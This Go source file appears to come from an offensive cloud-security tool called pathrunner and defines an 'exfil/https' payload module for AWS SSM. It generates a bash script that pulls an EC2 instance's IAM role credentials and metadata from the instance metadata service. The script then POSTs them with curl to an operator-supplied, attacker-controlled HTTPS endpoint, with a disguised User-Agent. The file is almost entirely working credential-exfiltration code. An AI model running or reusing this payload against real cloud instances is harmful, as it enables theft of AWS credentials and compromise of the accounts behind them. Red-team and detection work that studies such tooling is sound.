// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ssm

import (
	"fmt"
	"strings"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
)

// ExfilHTTPSPayload exfiltrates instance role credentials from IMDS to an
// attacker-controlled HTTPS endpoint via an SSM command.
type ExfilHTTPSPayload struct{}

func init() {
	_ = payloads.Register(&ExfilHTTPSPayload{})
}

func (p *ExfilHTTPSPayload) GetName() string {
	return "exfil/https"
}

func (p *ExfilHTTPSPayload) GetDescription() string {
	return "Exfiltrate instance role credentials to an attacker-controlled HTTPS endpoint via SSM command"
}

func (p *ExfilHTTPSPayload) GetTags() []string {
	return []string{
		payloads.TagServiceSSM,
		payloads.TagLanguageBash,
		payloads.TagTechniqueExfil,
		payloads.TagTransportHTTPS,
	}
}

func (p *ExfilHTTPSPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "HTTPS_URL",
			Description: "Target HTTPS URL for credential exfiltration",
			Required:    true,
		},
		{
			Name:        "INCLUDE_METADATA",
			Description: "Include additional instance metadata (hostname, region, etc.)",
			Required:    false,
			Default:     "true",
		},
		{
			Name:        "USER_AGENT",
			Description: "Custom User-Agent for HTTP requests",
			Required:    false,
			Default:     "AWS-EC2-Instance",
		},
	}
}

func (p *ExfilHTTPSPayload) Validate(options map[string]string) error {
	if options["HTTPS_URL"] == "" {
		return fmt.Errorf("HTTPS_URL is required for exfil/https payload")
	}
	httpsURL := options["HTTPS_URL"]
	if !strings.HasPrefix(httpsURL, "http://") && !strings.HasPrefix(httpsURL, "https://") {
		return fmt.Errorf("HTTPS_URL must start with http:// or https://")
	}
	return nil
}

func (p *ExfilHTTPSPayload) GenerateCode(options map[string]string) (string, error) {
	httpsURL := options["HTTPS_URL"]
	includeMetadata := options["INCLUDE_METADATA"] != "false"
	userAgent := options["USER_AGENT"]
	if userAgent == "" {
		userAgent = "AWS-EC2-Instance"
	}

	metadataBlock := ""
	metadataJSON := ""
	if includeMetadata {
		metadataBlock = `
INSTANCE_ID=$(imds_get /latest/meta-data/instance-id)
HOSTNAME=$(imds_get /latest/meta-data/hostname)
AZ=$(imds_get /latest/meta-data/placement/availability-zone)
`
		metadataJSON = `,
  "instance_id": "$INSTANCE_ID",
  "hostname": "$HOSTNAME",
  "region": "$REGION",
  "availability_zone": "$AZ"`
	}

	script := fmt.Sprintf(`echo "Pathrunner: exfil/https"
echo "Target URL: %s"

%s
%s
if [ -z "$ROLE_NAME" ]; then
    echo "ERROR: No IAM role attached to this instance"
    exit 1
fi

echo "Found role: $ROLE_NAME"

PAYLOAD=$(cat <<PAYLOAD
{
  "type": "ssm_credential_exfil",
  "role_name": "$ROLE_NAME",
  "credentials": {
    "access_key_id": "$AWS_ACCESS_KEY_ID",
    "secret_access_key": "$AWS_SECRET_ACCESS_KEY",
    "session_token": "$AWS_SESSION_TOKEN"
  }%s
}
PAYLOAD
)

echo "Exfiltrating credentials to HTTPS endpoint..."
RESPONSE=$(curl -sk -w "%%{http_code}" -o /tmp/exfil_response.txt \
  -X POST \
  -H "User-Agent: %s" \
  -H "Content-Type: application/json" \
  -H "X-Pathrunner: ssm-exfil" \
  -d "$PAYLOAD" \
  "%s")

HTTP_CODE="${RESPONSE: -3}"

if [ "$HTTP_CODE" -eq 200 ] 2>/dev/null; then
    echo "SUCCESS: Credentials exfiltrated successfully (HTTP 200)"
    cat /tmp/exfil_response.txt
else
    echo "WARNING: Endpoint returned HTTP $HTTP_CODE"
    cat /tmp/exfil_response.txt
fi
`, httpsURL, IMDSHelperSnippet(), metadataBlock, metadataJSON, userAgent, httpsURL)

	return script, nil
}

func (p *ExfilHTTPSPayload) ProcessResult(result string) (string, error) {
	return result, nil
}
